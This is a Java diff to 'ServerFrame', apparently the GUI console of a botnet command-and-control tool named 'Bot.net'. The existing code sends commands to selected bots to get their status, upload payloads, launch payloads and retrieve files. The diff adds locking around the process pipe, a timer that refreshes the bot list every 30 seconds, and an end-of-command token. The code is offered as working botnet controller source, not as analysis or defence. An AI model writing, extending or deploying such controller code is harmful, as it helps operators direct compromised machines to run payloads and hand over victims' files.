@@ -26,6 +26,8 @@ import java.util.concurrent.Future;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
+import java.util.concurrent.locks.Lock;
+import java.util.concurrent.locks.ReentrantLock;
 
 import javax.swing.DefaultListModel;
 import javax.swing.JButton;
@@ -37,6 +39,7 @@ import javax.swing.JMenuBar;
 import javax.swing.JMenuItem;
 import javax.swing.JPanel;
 import javax.swing.JScrollPane;
+import javax.swing.Timer;
 import javax.swing.event.ListSelectionEvent;
 import javax.swing.event.ListSelectionListener;
 
@@ -52,13 +55,16 @@ public class ServerFrame extends JFrame {
     private final JList botList;
     private final JMenuItem menuItem;
     private final JButton b1, b2, b3;
-    
-    
+    private Timer timer;
+    private final int DELAY = 30 * 1000; //miliseconds
+    private Lock pipeLock;                      //guards access to process pipe
     private BufferedReader readProc;
     private BufferedReader readProcErr;
     private BufferedWriter writeProc;
     private ProcessBuilder pb;
     private Process p;
+    
+    
     private final static boolean RIGHT_TO_LEFT = false; 
     //constants to set
     private final static String PYTHONSCRIPT = "";
@@ -67,6 +73,7 @@ public class ServerFrame extends JFrame {
     private final static String UPLOADPAYLOADS = "$UP$";
     private final static String LAUNCHPAYLOADS = "$LP$";
     private final static String RETRIEVEFILES = "$RF$";
+    private final static String ENDCOMMAND = "$ENDL$";
     private final static char DELIMITER = '$';
     
     private List<String> selectedValuesList;
@@ -75,7 +82,7 @@ public class ServerFrame extends JFrame {
         super("Bot.net");
         startUp();
         
-        
+        pipeLock = new ReentrantLock();
         LAYOUT = new BorderLayout();
         JPanel pane = new JPanel(LAYOUT);
         
@@ -97,6 +104,7 @@ public class ServerFrame extends JFrame {
                     for(String tmp: selectedValuesList)
                     {
                         String[] splited = tmp.split("\\s+");
+                        pipeLock.lock();
                         try
                         {
                             writeProc.write(LAUNCHPAYLOADS + splited[0]);   
@@ -105,6 +113,11 @@ public class ServerFrame extends JFrame {
                         {
                             System.out.println(exc);
                         }
+                        finally
+                        {
+                            pipeLock.unlock();
+                        }
+                                
                     }
                 }
             }
@@ -122,6 +135,7 @@ public class ServerFrame extends JFrame {
                     for(String tmp: selectedValuesList)
                     {
                         String[] splited = tmp.split("\\s+");
+                        pipeLock.lock();
                         try
                         {
                             writeProc.write(UPLOADPAYLOADS + splited[0]);   
@@ -129,6 +143,10 @@ public class ServerFrame extends JFrame {
                         catch(Exception exc)
                         {
                             System.out.println(exc);
+                        }
+                        finally
+                        {
+                            pipeLock.unlock();
                         }
                     }
                 }
@@ -150,6 +168,7 @@ public class ServerFrame extends JFrame {
                     for(String tmp: selectedValuesList)
                     {
                         String[] splited = tmp.split("\\s+");
+                        pipeLock.lock();
                         try
                         {
                             writeProc.write(RETRIEVEFILES + splited[0]);   
@@ -157,6 +176,10 @@ public class ServerFrame extends JFrame {
                         catch(Exception exc)
                         {
                             System.out.println(exc);
+                        }
+                        finally
+                        {
+                            pipeLock.unlock();
                         }
                     }
                 }
@@ -240,7 +263,17 @@ public class ServerFrame extends JFrame {
         this.setSize(800,600);
         this.setVisible(true);
         
-
+        //timer to trigger periodic updates of botlist
+        timer = new Timer(DELAY, new ActionListener()
+        {
+           @Override
+                public void actionPerformed(ActionEvent e)
+                {
+                    System.out.println("Updating List Event");
+                    updateList();
+                } 
+        });
+        timer.start();
     }//end ServerFrame
     
     private void startUp()
@@ -266,28 +299,38 @@ public class ServerFrame extends JFrame {
     private void updateList()
     {
         ArrayList<String>Updated = new ArrayList<>();
+        pipeLock.lock();
         try
         {
-            writeProc.write(GETBOTSTATUS);   
-        }
-        catch(Exception e)
-        {
-            System.out.println(e);
-        }
-        try
-        {
-            String currentLine;
-            while(null != (currentLine = readProc.readLine()))
+            writeProc.write(GETBOTSTATUS);  
+            try
             {
-                //reformat the line
-                Updated.add(currentLine.replace(DELIMITER, ' '));
+                String currentLine;
+                while(null != (currentLine = readProc.readLine()))
+                {
+                    //reformat the line
+                    Updated.add(currentLine.replace(DELIMITER, ' '));
+                }
+            }
+            catch(Exception e)
+            {
+                System.out.println(e);
             }
         }
         catch(Exception e)
         {
             System.out.println(e);
-        }   
-    }//end updateList()  
+        }
+        finally
+        {
+            pipeLock.unlock();
+        }
+           
+    }//end updateList()
+    
+    
+    
+    
 }//end class ServerFrame
 
 
